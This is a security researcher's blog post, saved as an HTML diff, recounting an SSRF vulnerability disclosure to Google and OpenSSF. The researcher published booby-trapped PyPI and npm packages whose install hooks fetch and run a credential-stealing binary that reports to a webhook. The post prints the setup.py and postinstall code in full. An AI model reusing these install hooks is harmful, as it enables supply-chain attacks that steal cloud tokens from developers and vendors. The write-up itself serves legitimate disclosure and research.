@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <title>codemuch.tech | Launching a supply chain counter-attack against Google&#x2F;OpenSSF</title>
+    
+    <link rel="stylesheet" href="https://codemuch.tech/style.css?h=c3083d9ba76bdaea32df">
+    
+    
+        
+    
+</head>
+<body>
+    
+<header class="space">
+    <a href="https:&#x2F;&#x2F;codemuch.tech">&LeftArrow; Home</a>
+</header>
+
+    
+<main>
+    <h1>Launching a supply chain counter-attack against Google&#x2F;OpenSSF</h1>
+    
+    <p class="secondary small">
+        23 April, 2022
+
+        
+        
+        
+        
+        
+
+        
+        
+        - Categories:
+        
+        
+        <a href="https:&#x2F;&#x2F;codemuch.tech&#x2F;categories&#x2F;vuln-research&#x2F;">vuln research</a>,
+        
+        
+        <a href="https:&#x2F;&#x2F;codemuch.tech&#x2F;categories&#x2F;cloud-hacking&#x2F;">cloud hacking</a>,
+        
+        
+        <a href="https:&#x2F;&#x2F;codemuch.tech&#x2F;categories&#x2F;supply-chain-attack&#x2F;">supply chain attack</a>
+        
+        
+    </p>
+    
+    <div class="space"></div>
+    <p>I spent some time hunting for <em>server side request forgery</em> (SSRF) vulnerabilities. SSRF allows an attacker to forward unsanitized queries from a public endpoint to an internal and private service. This can result in the service performing malicious actions, or leaking sensitive metadata that can be used for privilege escalation.</p>
+<p>This attack has become more prominent in the cloud-native era. Vulnerability disclosures for SSRF often demonstrate impact by querying the internal <em>instance metadata endpoint</em> (standardized by many cloud providers as <code>169.254.169.254</code>). This exists internally for code running on a container/VM to grab basic information about the compute instance. However, these endpoints can also be used to leak tokens useful for privilege escalation and environment escape.</p>
+<p>I tested against a variety of cloud-based services that specialized in executing customer code. This includes:</p>
+<ul>
+<li>Remote terminals</li>
+<li>Remote IDEs</li>
+<li>Jupyter notebooks</li>
+<li>LaTeX editors</li>
+<li>CI/CD pipelines</li>
+</ul>
+<p>While I was able to disclose some high-severity vulnerabilities, such as with <a href="https://www.gitpod.io/security/thanks">Gitpod</a>, I thought more deeply about other services where it's unexpected to carry out SSRF attacks.</p>
+<p>After some research, I want to share a cool disclosure I made to Google and an organization they partner with, the <a href="https://openssf.org">Open Source Security Foundation</a>. They design and implement critical supply chain defenses for the web, and we'll be exploiting a service they've deployed for dynamic package analysis, which has <a href="https://github.com/ossf/package-analysis/blob/main/docs/case_studies.md">caught many malicious packages in the wild</a>.</p>
+<h2 id="supply-chain-insecurity">Supply Chain Insecurity</h2>
+<p>Some threat actors are now targeting developers through supply chain attacks that trick them into installing malicious software packages. A commonly employed tactic is typosquatting, where the attacker registers a package similarly named to a popular one, in the hopes that developers that mispell the original will install the malicious one instead.</p>
+<p>Vendors are responding by deploying detection pipelines that monitor package registries for malicious packages. When attempting to understand how such systems would be implemented, prior research that stood out was <a href="https://twitter.com/jw_sec">Jordan Wright</a>’s work on <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">hunting down malicious PyPI packages</a> and Duan et Al.’s <a href="https://www.ndss-symposium.org/ndss-paper/towards-measuring-supply-chain-attacks-on-package-managers-for-interpreted-languages/">NDSS paper</a>.</p>
+<p>Both highlight the use of cloud automation combined with eBPF-based dynamic tracing, specifically with <strong><a href="https://github.com/draios/sysdig">sysdig</a>,</strong> to record syscall-based execution behavior of packages during the install process. This makes sense, as creating tailored static analysis detections involves a lot of effort and testing for precision. With the eBPF subsystem becoming more convenient for telemetry tooling, we can hypothesize that many vendors deploying package detection pipelines will rely on dynamic tracing to help determine package maliciousness.</p>
+<h2 id="sneak-y-around">Sneak-y Around</h2>
+<p>This gave me the idea to upload some of my own malicious packages, but instead of hacking a poor developer that installs it, we'll target potential vendors that are monitoring changes to package registries and pulling it down for tracing. This attack chain is outlined here:</p>
+<p><img src="/blog/supply-chain-counterattack/SSRF.png" alt="AttackChain" /></p>
+<p>These packages will download and execute a small piece of malware I wrote, which will notify me with discovered SSRF opportunities. It has the following workflow:</p>
+<ol>
+<li>Do some initial fingerprinting by dumping out environment variables, which can help identify potential service/container names, and maybe even authorization tokens/secrets.</li>
+<li>Make an initial request against known instance metadata endpoints to see if we receive a response
+<ol>
+<li>If identified, make additional requests against the endpoint to drop sensitive credentials and make other enumerations. An example can be seen in the code <a href="https://github.com/ex0dus-0x/sneak/blob/main/cloud.go#L131-L134">here</a>, against the AWS IMDSv1 endpoint.</li>
+</ol>
+</li>
+<li>Enumerate for other outbound addresses the host we’re in can speak to (NOTE: this actually not yet implemented, but I’d imagine implementing a barebones netstat clone).</li>
+<li>Exfiltrate all these results to a specified webhook URL we control.</li>
+</ol>
+<p>You can play around with this Golang-based malware, which I named <strong>sneak</strong>, <a href="https://github.com/ex0dus-0x/sneak">here</a>. Simply running the binary will kick off the enumeration process, and specifying a <code>--webhook</code> flag will exfiltrate any results to a webhook service (I used <a href="https://webhook.site/#!/faec153e-a214-474f-81c8-14a1bad77298">webhook.site</a>). One feature is being able to set that webhook input during build-time using <code>-ldflags</code>, which will bake that URL in to the resulting binary without source modification. This can be useful if one is uploading sneak to an environment where you cannot pass command-line arguments to it.</p>
+<h3 id="launching-the-attack">Launching the Attack</h3>
+<p>I built and stored the malware as a <a href="https://github.com/ex0dus-0x/sneak/releases/tag/prerelease">release</a> for the repo, and deployed two “wrapper” packages for PyPI and npm called <code>intentionally-malicious</code>. The PyPI one looks like this:</p>
+<pre data-lang="python" style="background-color:#31333d;color:#ffffffc4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#707180;">&quot;&quot;&quot;
+</span><span style="color:#707180;">setup.py
+</span><span style="color:#707180;">&quot;&quot;&quot;
+</span><span style="color:#db7c6d;">import </span><span>os
+</span><span style="color:#db7c6d;">import </span><span>urllib.request
+</span><span style="color:#db7c6d;">import </span><span>ssl
+</span><span style="color:#db7c6d;">from </span><span>subprocess </span><span style="color:#db7c6d;">import </span><span>Popen, </span><span style="font-weight:bold;color:#a3cbe3;">PIPE</span><span>, </span><span style="font-weight:bold;color:#a3cbe3;">STDOUT
+</span><span>
+</span><span style="color:#db7c6d;">from </span><span>setuptools </span><span style="color:#db7c6d;">import </span><span>setup
+</span><span style="color:#db7c6d;">from </span><span>setuptools.command.install </span><span style="color:#db7c6d;">import </span><span>install
+</span><span>
+</span><span>ssl._create_default_https_context </span><span style="color:#db7c6d;">= </span><span>ssl._create_unverified_context
+</span><span>
+</span><span style="font-weight:bold;color:#a3cbe3;">MALWARE </span><span style="color:#db7c6d;">= </span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>https://github.com/ex0dus-0x/sneak/releases/download/prerelease/sneak</span><span style="font-weight:bold;color:#dbbb3d;">&quot;
+</span><span style="font-weight:bold;color:#a3cbe3;">WEBHOOK </span><span style="color:#db7c6d;">= </span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>https://&lt;WEBHOOK_URL&gt;.com/</span><span style="font-weight:bold;color:#dbbb3d;">&quot;
+</span><span>
+</span><span style="color:#db7c6d;">class </span><span style="font-weight:bold;color:#dbbb3d;">IntentionallyMalicious</span><span>(</span><span style="color:#a3cbe3;">install</span><span>):
+</span><span>    </span><span style="color:#db7c6d;">def </span><span style="color:#a2ba43;">run</span><span>(</span><span style="color:#ffffff;">self</span><span>):
+</span><span>        fd </span><span style="color:#db7c6d;">= </span><span>urllib.request.</span><span style="font-weight:bold;color:#a3cbe3;">urlretrieve</span><span>(</span><span style="font-weight:bold;color:#a3cbe3;">MALWARE</span><span>, </span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>sneak</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>, )
+</span><span>        os.</span><span style="font-weight:bold;color:#a3cbe3;">system</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>chmod +x ./sneak</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>)
+</span><span>        cmd </span><span style="color:#db7c6d;">= </span><span style="color:#a3cbe3;">f</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>./sneak -webhook={</span><span style="font-weight:bold;color:#a3cbe3;">WEBHOOK</span><span>}</span><span style="font-weight:bold;color:#dbbb3d;">&#39;
+</span><span>        p </span><span style="color:#db7c6d;">= </span><span style="font-weight:bold;color:#a3cbe3;">Popen</span><span>(cmd, </span><span style="color:#ffffff;">shell</span><span style="color:#db7c6d;">=</span><span style="color:#ffffff;">True</span><span>, </span><span style="color:#ffffff;">stdin</span><span style="color:#db7c6d;">=</span><span style="font-weight:bold;color:#a3cbe3;">PIPE</span><span>, </span><span style="color:#ffffff;">stdout</span><span style="color:#db7c6d;">=</span><span style="font-weight:bold;color:#a3cbe3;">PIPE</span><span>, </span><span style="color:#ffffff;">stderr</span><span style="color:#db7c6d;">=</span><span style="font-weight:bold;color:#a3cbe3;">STDOUT</span><span>, </span><span style="color:#ffffff;">close_fds</span><span style="color:#db7c6d;">=</span><span style="color:#ffffff;">True</span><span>)
+</span><span>        p.</span><span style="font-weight:bold;color:#a3cbe3;">communicate</span><span>()
+</span><span>
+</span><span style="font-weight:bold;color:#a3cbe3;">setup</span><span>(
+</span><span>    </span><span style="color:#ffffff;">name</span><span style="color:#db7c6d;">=</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>intentionally-malicious1</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>,
+</span><span>    </span><span style="color:#ffffff;">cmdclass</span><span style="color:#db7c6d;">=</span><span>{
+</span><span>        </span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>install</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>: IntentionallyMalicious
+</span><span>    },
+</span><span>    </span><span style="color:#ffffff;">...
+</span><span>)
+</span></code></pre>
+<p>We adopt an approach used by many package-based attackers, where malicious behavior triggers upon <code>pip install</code> through arbitrary code in the package's <code>setup.py</code>. We do the same with the npm one, populating the <code>postinstall</code> field as part of the <code>package.json</code> manifest:</p>
+<pre data-lang="js" style="background-color:#31333d;color:#ffffffc4;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#a3cbe3;">const </span><span style="font-weight:bold;color:#a3cbe3;">request </span><span style="color:#db7c6d;">= require</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>request</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>);
+</span><span style="color:#a3cbe3;">const </span><span style="font-weight:bold;color:#a3cbe3;">fs </span><span style="color:#db7c6d;">= require</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>fs</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>);
+</span><span style="color:#a3cbe3;">const </span><span style="font-weight:bold;color:#a3cbe3;">exec </span><span style="color:#db7c6d;">= require</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>child_process</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>).</span><span style="font-weight:bold;color:#a3cbe3;">exec</span><span>;
+</span><span>
+</span><span style="color:#a3cbe3;">const </span><span style="font-weight:bold;color:#a3cbe3;">url </span><span style="color:#db7c6d;">= </span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>https://github.com/ex0dus-0x/sneak/releases/download/prerelease/sneak</span><span style="font-weight:bold;color:#dbbb3d;">&quot;
+</span><span style="color:#a3cbe3;">const </span><span style="font-weight:bold;color:#a3cbe3;">file </span><span style="color:#db7c6d;">= </span><span style="font-weight:bold;color:#a3cbe3;">fs</span><span>.</span><span style="color:#a2ba43;">createWriteStream</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>sneak</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>);
+</span><span style="color:#a2ba43;">request</span><span>({
+</span><span>  followAllRedirects</span><span style="font-weight:bold;color:#db7c6d;">: </span><span style="color:#ffffff;">true</span><span>,
+</span><span>  url</span><span style="font-weight:bold;color:#db7c6d;">: </span><span style="font-weight:bold;color:#a3cbe3;">url
+</span><span>}, </span><span style="color:#a3cbe3;">function </span><span style="font-weight:bold;color:#dbbb3d;">(</span><span style="color:#ffffff;">error</span><span>, </span><span style="color:#ffffff;">response</span><span>, </span><span style="color:#ffffff;">body</span><span style="font-weight:bold;color:#dbbb3d;">) </span><span>{
+</span><span>  </span><span style="color:#a2ba43;">request</span><span>(</span><span style="font-weight:bold;color:#a3cbe3;">url</span><span>).</span><span style="color:#a2ba43;">pipe</span><span>(</span><span style="font-weight:bold;color:#a3cbe3;">file</span><span>).</span><span style="color:#a2ba43;">on</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>close</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>, </span><span style="color:#a3cbe3;">function</span><span style="font-weight:bold;color:#dbbb3d;">() </span><span>{
+</span><span>    </span><span style="color:#e7e7e7;">console</span><span>.</span><span style="color:#db7c6d;">log</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>done</span><span style="font-weight:bold;color:#dbbb3d;">&quot;</span><span>);
+</span><span>    </span><span style="color:#a2ba43;">exec</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>chmod +x ./sneak &amp;&amp; ./sneak -webhook=https://&lt;WEBHOOK_URL&gt;.com/</span><span style="font-weight:bold;color:#dbbb3d;">&#39;</span><span>)
+</span><span>      </span><span style="color:#db7c6d;">if </span><span>(</span><span style="font-weight:bold;color:#a3cbe3;">err</span><span>) {
+</span><span>          </span><span style="color:#e7e7e7;">console</span><span>.</span><span style="color:#db7c6d;">log</span><span>(</span><span style="font-weight:bold;color:#a3cbe3;">err</span><span>);
+</span><span>          </span><span style="color:#db7c6d;">return</span><span>;
+</span><span>      }
+</span><span>      </span><span style="color:#e7e7e7;">console</span><span>.</span><span style="color:#db7c6d;">log</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">`</span><span>stdout: ${</span><span style="font-weight:bold;color:#a3cbe3;">stdout</span><span>}</span><span style="font-weight:bold;color:#dbbb3d;">`</span><span>);
+</span><span>      </span><span style="color:#e7e7e7;">console</span><span>.</span><span style="color:#db7c6d;">log</span><span>(</span><span style="font-weight:bold;color:#dbbb3d;">`</span><span>stderr: ${</span><span style="font-weight:bold;color:#a3cbe3;">stderr</span><span>}</span><span style="font-weight:bold;color:#dbbb3d;">`</span><span>);
+</span><span>    });
+</span><span>  });
+</span><span>});
+</span></code></pre>
+<p>After uploading both to their respective registries, I crossed my fingers and waited for vendors on the Internet to execute them and hopefully produce interesting results.</p>
+<p>Initially, I saw some requests come in that were not useful for further exploitation. However, some time after pushing up the npm package, an interesting request came in:</p>
+<p><img src="/blog/supply-chain-counterattack/SSRF_out.png" alt="SSRF_out" /></p>
+<p>We can see a leaked OAuth token and a service account and project name associated with OpenSSF. We can also see the <code>https://www.googleapis.com/auth/cloud-platform</code> scope present for the token. This means that we can escape this environment, and potentially access/takeover other resources within this GCP project! GitLab Security has a comprehensive post that discusses post-exploitation in GCP, which you can read about <a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">here</a>.</p>
+<p>It seems that our malware was picked up by a Google-deployed version of the <a href="https://github.com/ossf/package-feeds">ossf/package-feeds</a> project, which routinely watches for new packages in the NPM registry feed for threat scanning. It saw our new package, and published the metadata to an analysis worker from the <a href="https://github.com/ossf/package-analysis">ossf/package-analysis</a> project. This analyzed our package by spinning up a <a href="https://podman.io">Podman</a>-based sandbox container to install it and record a dynamic trace of execution behavior. The container didn’t restrict access to the instance metadata API, hence allowing <strong>sneak</strong> to steal a more privileged authorization token!</p>
+<p>I submitted a report to Google’s <a href="https://bughunters.google.com/about/rules/google-friends/6625378258649088/google-and-alphabet-vulnerability-reward-program-vrp-rules">Vulnerability Reward Program</a>, and after a quick turnaround, they added several patches into their package detection infrastructure, and awarded me with a bounty!</p>
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>This disclosure is not only interesting because of the unique environment that SSRF was exploited in, but also provides evidence that more discussion is needed around sandboxes that analyze and "detonate" malware. Such systems are themselves attack surfaces of the vendor, and can easily be interacted with by untrusted actors. This present an initial access risk to other internal services if privilege escalation is possible, and/or disruption of analysis capabilities.</p>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li>March 2, 2022 - Initial discovery</li>
+<li>March 3, 2022 - Report disclosed to Google’s VRP</li>
+<li>March 10, 2022 - Vulnerability is triaged as Priority 1, Severity 1</li>
+<li>March 10, 2022 - After looking at the OAuth token, Google Security confirms and accepted the report</li>
+<li>March 23, 2022 - Patches are applied</li>
+<li>March 29, 2022 - VRP panel awarded a $1,337 bounty</li>
+</ul>
+
+</main>
+
+    <div class="dark-mode-buttons">
+        <button class="dark-mode-button" id="dark-mode-on"><img src="https://codemuch.tech/dark_mode.svg" width="24" height="24" alt="Dark mode" aria-label="dark mode toggle" title="Dark mode"></button>
+        <button class="dark-mode-button" id="dark-mode-off"><img src="https://codemuch.tech/light_mode.svg" width="24" height="24" alt="Light mode" aria-label="light mode toggle" title="Light mode"></button>
+    </div>
+    <script>
+        const cls = document.querySelector("html").classList;
+        const sessionTheme = sessionStorage.getItem("theme");
+
+        function setDark() {
+            cls.add("dark-mode");
+            cls.remove("light-mode");
+            sessionStorage.setItem("theme", "dark");
+        }
+        function setLight() {
+            cls.add("light-mode");
+            cls.remove("dark-mode");
+            sessionStorage.setItem("theme", "light");
+        }
+
+        if (sessionTheme === "dark") {
+            setDark();
+        } else if (sessionTheme === "light") {
+            setLight();
+        } else if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+            setDark();
+        }
+
+        document.getElementById("dark-mode-on").addEventListener("click", function(e) {
+            setDark();
+        });
+        document.getElementById("dark-mode-off").addEventListener("click", function(e) {
+            setLight();
+        });
+    </script>
+    <noscript>
+        <style>
+            .dark-mode-buttons {
+                display: none;
+            }
+        </style>
+    </noscript>
+</body>
+</html>
